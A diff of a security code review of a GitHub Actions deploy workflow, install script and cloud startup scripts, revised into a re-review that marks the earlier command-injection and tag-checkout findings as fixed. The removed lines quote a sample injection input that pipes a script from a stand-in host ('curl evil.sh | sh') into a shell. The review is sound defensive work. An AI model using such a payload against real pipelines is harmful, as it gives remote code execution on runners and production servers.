@@ -1,8 +1,8 @@
 ---
 phase: 03-update-path-reconciliation
-reviewed: 2026-07-02T07:53:37Z
+reviewed: 2026-07-23T00:00:00Z
 depth: standard
-files_reviewed: 14
+files_reviewed: 13
 files_reviewed_list:
   - .github/workflows/cd.yml
   - docs/02-architecture.md
@@ -19,254 +19,158 @@ files_reviewed_list:
   - infra/gcp/startup.sh
   - install.sh
 findings:
-  critical: 1
-  warning: 5
-  info: 4
-  total: 10
+  critical: 0
+  warning: 1
+  info: 5
+  total: 6
 status: issues_found
 ---
 
-# Phase 3: Code Review Report
+# Phase 3: Code Review Report (Re-Review / Reconciliation)
 
-**Reviewed:** 2026-07-02T07:53:37Z
+**Reviewed:** 2026-07-23T00:00:00Z
 **Depth:** standard
-**Files Reviewed:** 14
+**Files Reviewed:** 13
 **Status:** issues_found
 
 ## Summary
 
-This phase removed the auto-update cron from provisioning (`install.sh`, all three
-`startup.sh` scripts, deleted `scripts/auto-update.sh`) and re-pointed the CD deploy
-path at a specific release tag instead of `origin/main`. The cron removal is clean and
-consistent across all files. The docs were largely updated to match.
+This is a **re-review** of a SHIPPED phase (v1.0). The prior `03-REVIEW.md` (2026-07-02)
+reported 10 findings (1 critical, 5 warning, 4 info). Every prior finding was
+re-verified against the **current** code. The bulk of the substantive findings have since
+been fixed:
 
-The CD change, however, introduces a **command-injection vulnerability** by switching
-the SSH heredoc delimiter from quoted (`'DEPLOY'`) to unquoted (`DEPLOY`) and pasting a
-GitHub Actions expression (`${{ env.DEPLOY_TAG }}`) — whose value originates from a free-
-text `workflow_dispatch` input — directly into a shell script. This is the classic
-GitHub Actions script-injection pattern and is exploitable by anyone who can trigger a
-manual dispatch. It must be fixed before this ships. Several correctness/robustness gaps
-around the tag-checkout path and one stale-doc defect (troubleshooting D3 still documents
-the old, now-removed behavior as a live bug) round out the findings.
+- **CR-01 (command injection in `cd.yml`) — FIXED.** The untrusted `release_tag` /
+  `github.event.release.tag_name` are now bound to env vars (`RELEASE_TAG_NAME`,
+  `DISPATCH_TAG`) in the "Resolve deploy tag" step, validated against an allowlist regex
+  (`^[A-Za-z0-9][A-Za-z0-9._-]*$`), and the SSH heredoc is **quoted** (`<< 'DEPLOY'`) with
+  `DEPLOY_TAG` passed as a remote environment variable. No workflow expression is expanded
+  into the script body host-side or VM-side. Not reported.
+- **WR-01 (checkout could resolve a branch/SHA, not a tag) — FIXED.** The remote script now
+  verifies `git rev-parse -q --verify "refs/tags/$DEPLOY_TAG^{commit}"` and checks out
+  `refs/tags/$DEPLOY_TAG`, refusing anything that is not an existing tag. The allowlist also
+  forbids `/`, blocking `refs/..`-style traversal. Not reported.
+- **WR-02 (`set -e` in heredoc doesn't fail the job) — RESOLVED in practice.** The remote
+  body runs via `ssh ... bash -s`, so a `set -e` abort propagates as the remote exit status,
+  which `ssh` returns and the step fails on. Combined with the deterministic post-loop check
+  below, the original risk no longer materializes. Not reported.
+- **WR-03 (health loop swallowed the failure signal) — FIXED.** After the loop, line 94 runs
+  `curl -sf http://localhost:8000/health || exit 1` (a deterministic never-came-up failure),
+  and a separate "Verify deployment" step (lines 102–111) curls the external `/health` and
+  fails on anything but `"status":"ok"`. Not reported.
+- **WR-05 (stale troubleshooting entry D3) — FIXED.** `docs/17-troubleshooting.md` D3 now
+  correctly describes the tag-pinned behavior ("resolves a `DEPLOY_TAG` ... checks out
+  `refs/tags/$DEPLOY_TAG`") and notes branch names are rejected. Not reported.
 
-## Critical Issues
-
-### CR-01: Command injection via `release_tag` input pasted into unquoted SSH heredoc
-
-**File:** `.github/workflows/cd.yml:45`, `:49`, `:55` (input source `:26`, `:34`)
-**Issue:**
-The `workflow_dispatch` input `release_tag` is a free-text `type: string` (line 10). Its
-value flows unsanitized to:
-
-1. `DEPLOY_TAG="${{ github.event.release.tag_name || inputs.release_tag }}"` (line 26)
-2. `echo "DEPLOY_TAG=$DEPLOY_TAG" >> "$GITHUB_ENV"` (line 34)
-3. `... << DEPLOY` (unquoted heredoc, line 45) with `git checkout --force "${{ env.DEPLOY_TAG }}"` (line 55) and `echo "=== Deploying GetVul ${{ env.DEPLOY_TAG }} ..."` (line 49).
-
-`${{ env.DEPLOY_TAG }}` is a GitHub Actions **expression**, substituted as raw text into
-the `run:` script *before* the shell parses it. Because the heredoc delimiter is now
-unquoted, the runner shell also performs `$(...)`, backtick, and `$VAR` expansion on the
-body. A dispatch with, for example:
-
-```
-release_tag:  v1.0.0"; curl evil.sh | sh; echo "
-```
-
-produces on the runner (and forwards to the production VM):
-
-```bash
-git checkout --force "v1.0.0"; curl evil.sh | sh; echo ""
-```
-
-Both the runner and the production VM execute the injected commands. Additionally, a
-newline in `release_tag` injects arbitrary variables into `$GITHUB_ENV` (line 34),
-including overriding later step env. Anyone with "Run workflow" permission (or a
-compromised PAT/branch) gets **remote code execution on the production VM** and the CD
-runner. This is a strict regression: the previous quoted heredoc did not expand the body.
-
-**Fix:**
-Do not interpolate untrusted input into the script body. Pass it through the environment
-and reference a shell variable (which does not re-expand), and validate the tag format
-before use:
-
-```yaml
-      - name: Resolve deploy tag
-        run: |
-          DEPLOY_TAG="${{ github.event.release.tag_name || inputs.release_tag }}"
-          if [ -z "$DEPLOY_TAG" ]; then
-            echo "ERROR: No deploy tag resolved." >&2
-            exit 1
-          fi
-          # Allowlist: only tag-name-safe characters
-          if ! printf '%s' "$DEPLOY_TAG" | grep -Eq '^[A-Za-z0-9._/-]+$'; then
-            echo "ERROR: release_tag contains illegal characters: $DEPLOY_TAG" >&2
-            exit 1
-          fi
-          echo "DEPLOY_TAG=$DEPLOY_TAG" >> "$GITHUB_ENV"
-
-      - name: Deploy to VM
-        env:
-          DEPLOY_TAG: ${{ env.DEPLOY_TAG }}
-        run: |
-          ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=no \
-            "${{ env.VM_USER }}@${{ env.VM_HOST }}" \
-            "DEPLOY_TAG=$DEPLOY_TAG bash -s" << 'DEPLOY'
-            set -e
-            cd /opt/getvul
-            echo "=== Deploying GetVul ${DEPLOY_TAG} $(date) ==="
-            git fetch --tags --force
-            # Verify the ref resolves to an actual tag, then check it out
-            git rev-parse -q --verify "refs/tags/${DEPLOY_TAG}^{commit}" >/dev/null \
-              || { echo "No such tag: ${DEPLOY_TAG}" >&2; exit 1; }
-            git checkout --force "refs/tags/${DEPLOY_TAG}"
-            docker compose build --no-cache
-            docker compose up -d
-            ...
-          DEPLOY
-```
-
-Keeping the heredoc **quoted** (`'DEPLOY'`) and passing `DEPLOY_TAG` as an environment
-variable to the remote shell removes both the runner-side and VM-side expansion of
-untrusted text. The regex allowlist is defense-in-depth.
+What genuinely **still exists** in the current code: one Warning (SSH host-key trust is
+decorative — `ssh-keyscan ... || true` paired with `StrictHostKeyChecking=no`), and four/five
+Info-level doc/script hygiene items (install.sh step-counter denominators still disagree; a
+`docs/13-deployment.md` "8 steps" / `NEXT_PUBLIC_API_URL=""` drift; a non-Fernet openssl
+fallback key in `install.sh`; a soft diagram ambiguity about CD/CI gating). One new Info item
+was surfaced (startup.sh still `git pull origin main` on re-provision, mildly at odds with the
+tag-pinned deploy intent). The Terraform modules (`infra/{aws,gcp,azure}/main.tf`) are clean:
+SSH ingress is gated on `var.ssh_allowed_cidrs`, AWS enforces IMDSv2, no hardcoded secrets.
 
 ## Warnings
 
-### WR-01: `git checkout --force "$DEPLOY_TAG"` will match a branch or commit-ish, not only a release tag
+### WR-01: SSH host-key trust is decorative — `ssh-keyscan` failure ignored and `StrictHostKeyChecking=no` on deploy
 
-**File:** `.github/workflows/cd.yml:55`
+**File:** `.github/workflows/cd.yml:55`, `:62` (verified against current code)
 **Issue:**
-`git checkout --force "<ref>"` resolves against branches, remote-tracking refs, and
-partial SHAs — not just tags. If `release_tag` is set to `main`, `origin/main`, or a raw
-SHA, CD silently deploys that instead of a real release tag, reintroducing exactly the
-"deploy arbitrary HEAD" behavior PROD-03 set out to remove. The comment on line 54 asserts
-"the released tag" but nothing enforces it.
-**Fix:** Disambiguate to the tags namespace and verify it exists before checkout:
-```bash
-git rev-parse -q --verify "refs/tags/${DEPLOY_TAG}^{commit}" >/dev/null \
-  || { echo "No such tag: ${DEPLOY_TAG}" >&2; exit 1; }
-git checkout --force "refs/tags/${DEPLOY_TAG}"
+The "Configure SSH" step runs
+`ssh-keyscan -H ${{ env.VM_HOST }} >> ~/.ssh/known_hosts 2>/dev/null || true` (line 55),
+which suppresses all errors, and the "Deploy to VM" step then connects with
+`-o StrictHostKeyChecking=no` (line 62). The combination means the runner will hand the
+deploy SSH key to — and execute the deploy script (and read `DEPLOY_TAG`) on — whatever host
+answers on `GCE_VM_IP`, with **no host-key verification**. `ssh-keyscan` is trust-on-first-use
+to begin with; pairing it with `StrictHostKeyChecking=no` makes the `known_hosts` write purely
+decorative. An attacker who can spoof/hijack that IP gets a MITM position on production deploys
+(harvest the deploy key, or serve attacker-controlled responses to the VM-side commands).
+**Fix:** Store the VM's known host key in a secret and write it to `known_hosts`, then use
+`StrictHostKeyChecking=yes` (or `accept-new`):
+```yaml
+      - name: Configure SSH
+        run: |
+          mkdir -p ~/.ssh
+          echo "${{ secrets.GCE_SSH_PRIVATE_KEY }}" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          echo "${{ secrets.GCE_KNOWN_HOSTS }}" >> ~/.ssh/known_hosts
+      - name: Deploy to VM
+        run: |
+          ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=yes \
+            "${{ env.VM_USER }}@${{ env.VM_HOST }}" DEPLOY_TAG="$DEPLOY_TAG" bash -s << 'DEPLOY'
+          ...
 ```
-
-### WR-02: `set -e` inside an SSH heredoc does not fail the CD job on remote error
-
-**File:** `.github/workflows/cd.yml:45-78`
-**Issue:**
-The remote script runs `set -e` (line 46), but `set -e` only controls the remote shell's
-exit. The overall step passes/fails on `ssh`'s exit code. Whether `ssh` propagates the
-remote exit code reliably here is fragile: the heredoc is fed on stdin, and any command in
-the block that fails but is not the last statement (e.g. `docker compose build` failing)
-depends on `set -e` firing *and* ssh forwarding that status. There is no `-o BatchMode`
-and no explicit check. A failed build or `docker compose up` can leave the VM
-half-deployed while the step may still be interpreted as progressing to the health loop.
-The health loop then runs 30×5s = 150s before the final `curl ... || exit 1` catches it —
-long, and only catches health, not build failure.
-**Fix:** Run the remote body via `ssh ... 'bash -s'` with `set -euo pipefail`, and confirm
-the step asserts on the SSH exit status. Consider failing fast on build/up rather than
-relying solely on the trailing health curl.
-
-### WR-03: Health-check loop swallows the failure signal; final verify can race
-
-**File:** `.github/workflows/cd.yml:62-72`
-**Issue:**
-The loop `for i in $(seq 1 30)` breaks on first success but does **not** track whether it
-ever succeeded. After the loop, line 72 re-curls `/health` once. If the app is flapping
-(healthy during the loop, unhealthy at line 72, or vice-versa) the outcome is inconsistent.
-More importantly, if all 30 attempts fail, the loop simply exits and relies entirely on the
-single line-72 curl — a redundant/again-flaky probe rather than a definitive "loop never
-succeeded → fail" signal.
-**Fix:** Track success explicitly and fail deterministically:
-```bash
-ok=0
-for i in $(seq 1 30); do
-  if curl -sf http://localhost:8000/health >/dev/null 2>&1; then ok=1; break; fi
-  sleep 5
-done
-[ "$ok" = 1 ] || { echo "health never came up" >&2; exit 1; }
-```
-
-### WR-04: `ssh-keyscan` failure is silently ignored, weakening host-key trust
-
-**File:** `.github/workflows/cd.yml:41`
-**Issue:**
-`ssh-keyscan -H ${{ env.VM_HOST }} >> ~/.ssh/known_hosts 2>/dev/null || true` swallows all
-errors, and the deploy step then uses `-o StrictHostKeyChecking=no` (line 45) anyway. The
-combination means the runner will connect to whatever host answers on that IP with no host-
-key verification — a man-in-the-middle deploying attacker-controlled code to, or harvesting
-the deploy key from, a spoofed endpoint. `ssh-keyscan` is trust-on-first-use to begin with;
-pairing it with `StrictHostKeyChecking=no` makes it purely decorative.
-**Fix:** Store the known host key in a secret and write it to `known_hosts`, then use
-`StrictHostKeyChecking=yes` (or `accept-new`). At minimum, drop the `|| true` so a keyscan
-failure is visible, and do not combine keyscan with `StrictHostKeyChecking=no`.
-
-### WR-05: Stale/incorrect troubleshooting entry D3 documents the removed behavior as a live bug
-
-**File:** `docs/17-troubleshooting.md:229-235`
-**Issue:**
-Entry **D3 "CD deploys old code"** still states the *cause* as
-`cd.yml does git fetch origin main && git reset --hard origin/main ([cd.yml:40-41])` and
-recommends the interim workaround of manually `git checkout v1.2.3`. That code path was
-removed in this very phase (replaced by `git fetch --tags --force` + `git checkout <tag>`).
-The line references (`cd.yml:40-41`) are also now wrong. An operator reading this during an
-incident will be actively misled about how CD behaves. This is the kind of doc drift the
-phase was supposed to eliminate (it correctly rewrote B1 but missed D3).
-**Fix:** Either delete D3 or rewrite it to describe the tag-pinned behavior — e.g. "CD now
-checks out the resolved release tag; if the VM shows old code, confirm the tag was pushed
-(`git fetch --tags --force`) and that `DEPLOY_TAG` resolved to the intended tag in the
-Actions log."
+At minimum, drop the `|| true` so a keyscan failure is visible, and do not combine keyscan
+with `StrictHostKeyChecking=no`.
 
 ## Info
 
-### IN-01: `install.sh` step numbering is internally inconsistent
+### IN-01: `install.sh` step-counter denominators are internally inconsistent
 
-**File:** `install.sh:37`, `:45`, `:50`, `:63`, `:67`, `:71`, `:87`, `:91`
+**File:** `install.sh:20`, `:32`, `:37`, `:45`, `:50`, `:63`, `:67`, `:71`, `:87`, `:91` (verified against current code)
 **Issue:**
-The banner says "runs 8 steps" in the docs, but `install.sh` labels are mismatched: Step 1
-is `[1/5]` (lines 20/32) while later steps use `/6` and `/7` (`[2/6]`, `[3/6]`, `[4/6]`,
-`[5/6]`, `[6/7]`, `[7/7]`). The `[1/5]` versus `[x/6]`/`[x/7]` denominators never agree, and
-there is no `create_admin` vs `seed` alignment with docs (13-deployment.md says "7 steps",
-07-project-structure.md says "7-step", the file header comment is gone). Cosmetic, but the
-counters are visibly wrong to any operator watching the install.
-**Fix:** Renumber all step labels to a single consistent denominator (there are 7 real
-steps now that cron is gone: Docker, TLS, .env, build, health-wait, admin, seed).
+Step 1 prints `[1/5]` (lines 20, 32), Steps 2–5 print `[2/6]`, `[3/6]`, `[4/6]`, `[5/6]`, and
+Steps 6–7 print `[6/7]`, `[7/7]`. The `/5`, `/6`, and `/7` denominators never agree, so an
+operator watching the install sees a counter that appears to reset/expand. There are 7 real
+steps now that the cron is gone (Docker, TLS, .env, build, health-wait, admin, seed).
+**Fix:** Renumber all labels to a single denominator, e.g. `[1/7]` … `[7/7]`.
 
-### IN-02: `docs/13-deployment.md` still claims "8 steps" / lists 7 with a cron reference removed
+### IN-02: `docs/13-deployment.md` says "8 steps" but lists 7, and claims an unwritten `NEXT_PUBLIC_API_URL=""`
 
-**File:** `docs/13-deployment.md:155-163`
+**File:** `docs/13-deployment.md:155-163` (verified against current code)
 **Issue:**
-Line 155 says "The install script runs 8 steps automatically" but only 7 are enumerated
-(1–7), and item 3 references `NEXT_PUBLIC_API_URL=""` which `install.sh` does not actually
-write into `.env` (lines 51-56 of install.sh only write DATABASE_URL, REDIS_URL,
-ENVIRONMENT, DEBUG, JWT_SECRET_KEY, ENCRYPTION_KEY). Minor doc/code drift left over from the
-cron removal.
+Line 155 states "The install script runs 8 steps automatically" but only items 1–7 are
+enumerated. Line 158 says step 3 creates `.env` "with auto-generated secrets (JWT key,
+encryption key, `NEXT_PUBLIC_API_URL=""`)" — but `install.sh` (lines 51–60) only writes
+`DATABASE_URL`, `REDIS_URL`, `ENVIRONMENT`, `DEBUG`, `JWT_SECRET_KEY`, and `ENCRYPTION_KEY`.
+It never writes `NEXT_PUBLIC_API_URL`. Doc/code drift left over from the cron removal.
+(By contrast, `docs/13-deployment.md:348`, `:503` and `docs/07-project-structure.md:22`
+correctly say "7 steps"/"7-step" — only the Azure section's enumerated list is wrong.)
 **Fix:** Change "8 steps" to "7 steps" and drop the `NEXT_PUBLIC_API_URL=""` claim (or add
-it to install.sh if it is actually required).
+the variable to `install.sh` if it is actually required for prod).
 
-### IN-03: `install.sh` generates a weak self-signed cert subject and non-Fernet fallback key
+### IN-03: `install.sh` `ENCRYPTION_KEY` fallback produces a non-Fernet key
 
-**File:** `install.sh:39-42`, `:59`
+**File:** `install.sh:59` (verified against current code)
 **Issue:**
-Not introduced by this phase, but in scope as a reviewed file. Line 59's fallback
-`openssl rand -base64 32` produces a value that is **not** a valid Fernet key (Fernet
-requires a 32-byte urlsafe-base64 key, i.e. `base64` of exactly 32 bytes with urlsafe
-alphabet and `=` padding — `openssl rand -base64 32` uses the standard alphabet and may
-contain `+`/`/`). If `python3`/cryptography is unavailable, the app will fail at runtime
-with `InvalidToken`/`ValueError` rather than at install time.
-**Fix:** Use `openssl rand -base64 32 | tr '+/' '-_'` as a closer fallback, or hard-fail
-the install if a valid Fernet key cannot be produced rather than writing an unusable one.
+`ENCRYPTION_KEY=$(python3 -c "...Fernet.generate_key()..." 2>/dev/null || openssl rand -base64 32)`.
+The fallback `openssl rand -base64 32` uses the **standard** base64 alphabet (may contain `+`
+and `/`), whereas Fernet requires a 32-byte **url-safe** base64 key. If `python3`/cryptography
+is unavailable at install time, the app writes an unusable key and fails later at runtime with
+`ValueError: Fernet key must be 32 url-safe base64-encoded bytes` / `InvalidToken` rather than
+failing loudly at install. (Not introduced by this phase, but in scope as a reviewed file.)
+**Fix:** Translate to the url-safe alphabet, e.g. `openssl rand -base64 32 | tr '+/' '-_'`, or
+hard-fail the install if a valid Fernet key cannot be produced instead of writing a broken one.
 
-### IN-04: `docs/diagrams/pipelines-cicd.mmd` node text can imply CI gates CD (it does not)
+### IN-04: `docs/diagrams/pipelines-cicd.mmd` can imply CI gates CD (it does not)
 
-**File:** `docs/diagrams/pipelines-cicd.mmd:20-28`
+**File:** `docs/diagrams/pipelines-cicd.mmd:17-30` (verified against current code)
 **Issue:**
-The CD subgraph and the "backend/frontend now hard-fail" note sit adjacent, and CD is
-triggered independently by release publish / manual dispatch with **no dependency on CI
-passing** (the `force` "skip CI check" input was removed but no CI gate replaced it). The
-diagram does not misstate this outright, but a reader may infer CI green is a precondition
-for CD. Worth an explicit "CD does not require CI green (see PROD-02 branch protection)"
-annotation to avoid a false sense of gating.
-**Fix:** Add a one-line note in the CD subgraph clarifying CD has no CI precondition today.
+CD is triggered independently by `release: published` and manual dispatch with **no dependency
+on CI passing**. The CD subgraph and the adjacent "backend/frontend now hard-fail" note sit
+close together; a reader may infer CI-green is a precondition for CD. The diagram doesn't state
+this outright, but an explicit annotation would prevent a false sense of gating.
+**Fix:** Add a one-line note in the CD subgraph, e.g. "CD has no CI precondition — gating is via
+branch protection (PROD-02)."
+
+### IN-05: `startup.sh` still `git pull origin main` on re-provision, mildly at odds with tag-pinned deploys
+
+**File:** `infra/gcp/startup.sh:61`, `infra/aws/startup.sh:61`, `infra/azure/startup.sh:39` (verified against current code)
+**Issue:**
+This phase removed the auto-update cron so a provisioned VM no longer fights CD by redeploying
+`main` HEAD on a timer. The `else` branch of the clone check in all three startup scripts still
+does `cd "$APP_DIR" && git pull origin main`. On a fresh VM this branch is dead (the directory
+does not exist yet, so the script clones), but if the startup script is ever re-run on an
+existing VM it pulls `main` rather than the deployed release tag — a latent re-introduction of
+the exact "runs main HEAD, not the released tag" behavior PROD-03 set out to eliminate.
+**Fix:** In the "already exists" branch, avoid moving the checkout: either leave the working
+tree untouched (let CD manage the ref) or `git fetch --tags --force` without checking out
+`main`. At minimum, add a comment clarifying that CD — not this script — owns the deployed ref
+after first boot.
 
 ---
 
-_Reviewed: 2026-07-02T07:53:37Z_
+_Reviewed: 2026-07-23T00:00:00Z (re-review / reconciliation of 2026-07-02 report)_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
